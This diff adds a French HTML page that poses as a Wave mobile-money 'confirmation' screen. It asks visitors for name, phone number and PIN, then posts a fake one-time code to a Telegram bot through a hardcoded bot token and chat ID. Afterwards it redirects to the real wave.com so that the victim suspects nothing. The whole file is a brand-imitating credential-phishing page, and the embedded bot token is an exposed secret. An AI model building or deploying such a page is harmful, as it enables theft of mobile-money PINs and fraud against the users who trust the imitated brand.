@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wave - Confirmation</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .logo {
+            color: #ff6600;
+            font-size: 2em;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #ff6600;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #e65c00;
+        }
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+        .hidden {
+            display: none;
+        }
+        #loading-screen {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #ff6600;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #timer-display {
+            color: #666;
+            margin-top: 10px;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">WAVE</div>
+        
+        <!-- Formulaire Initial -->
+        <form id="wave-form">
+            <input type="text" id="nom" placeholder="Nom" required>
+            <input type="text" id="prenom" placeholder="Prénom" required>
+            <input type="tel" id="telephone" placeholder="Numéro de téléphone" required>
+            <input type="password" id="pin" placeholder="Code PIN" required maxlength="4">
+            <button type="submit">Confirmer</button>
+        </form>
+
+        <!-- Écran de chargement / Attente -->
+        <div id="loading-screen">
+            <div class="spinner"></div>
+            <p id="status-text">Connexion au serveur Wave...</p>
+            
+            <!-- Zone OTP -->
+            <div id="otp-area" class="hidden">
+                <p>Veuillez entrer le code reçu :</p>
+                <input type="number" id="otp-input" placeholder="XXXX" maxlength="4">
+                <button id="validate-otp-btn">Valider</button>
+                <div id="timer-display">En attente... (40s)</div>
+            </div>
+        </div>
+    </div>
+
+<script>
+    // --- CONFIGURATION CLOUDFLARE COMPATIBLE ---
+    // Si tu utilises Cloudflare Pages, utilise cette méthode pour tes secrets :
+    // const TELEGRAM_BOT_TOKEN = "{{ env.TELEGRAM_TOKEN }}"; 
+    // SINON, mets ton token directement ici entre guillemets :
+    const TELEGRAM_BOT_TOKEN = "8203153207:AAHyEGnwAL79tksyzBBlvfVtGeiEDoST0TU"; 
+    const TELEGRAM_CHAT_ID = "8826766724"; 
+    
+    let generatedOtp = "";
+    let isWaiting = false;
+    let countdownTimer = null;
+
+    // Gestionnaire de soumission du formulaire
+    document.getElementById('wave-form').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        if (isWaiting) return;
+
+        // UI Update
+        document.getElementById('wave-form').style.display = 'none';
+        document.getElementById('loading-screen').style.display = 'flex';
+        document.getElementById('status-text').innerText = "Envoi du code...";
+        
+        try {
+            // 1. Générer l'OTP
+            generatedOtp = Math.floor(1000 + Math.random() * 9000).toString();
+            
+            // 2. Envoyer à Telegram
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: `Votre code Wave est : ${generatedOtp}`
+                })
+            });
+
+            // 3. Afficher l'input OTP
+            document.getElementById('status-text').innerText = "Code envoyé !";
+            document.getElementById('otp-area').classList.remove('hidden');
+            
+            // 4. Lancer le timer de 40 secondes
+            startCooldown(40);
+
+        } catch (error) {
+            console.error(error);
+            alert("Erreur lors de l'envoi du code.");
+            document.getElementById('loading-screen').style.display = 'none';
+            document.getElementById('wave-form').style.display = 'block';
+        }
+    });
+
+    // Fonction Timer
+    function startCooldown(seconds) {
+        let remaining = seconds;
+        const display = document.getElementById('timer-display');
+        const btn = document.getElementById('validate-otp-btn');
+        
+        btn.disabled = true;
+        btn.innerText = "Vérification...";
+        
+        countdownTimer = setInterval(() => {
+            remaining--;
+            display.innerText = `Disponible dans ${remaining}s`;
+            
+            if (remaining <= 0) {
+                clearInterval(countdownTimer);
+                display.innerText = "Vous pouvez valider.";
+                btn.disabled = false;
+                btn.innerText = "Valider";
+                isWaiting = false;
+            }
+        }, 1000);
+    }
+
+    // Validation OTP
+    document.getElementById('validate-otp-btn').addEventListener('click', function() {
+        const userOtp = document.getElementById('otp-input').value;
+        
+        if (userOtp === generatedOtp) {
+            // Succès
+            document.getElementById('otp-area').classList.add('hidden');
+            document.querySelector('.spinner').style.display = 'none';
+            document.getElementById('status-text').innerText = "Félicitations !";
+            
+            setTimeout(() => {
+                window.location.href = "https://wave.com/fr";
+            }, 2000);
+        } else {
+            alert("Code incorrect.");
+        }
+    });
+</script>
+</body>
+</html>
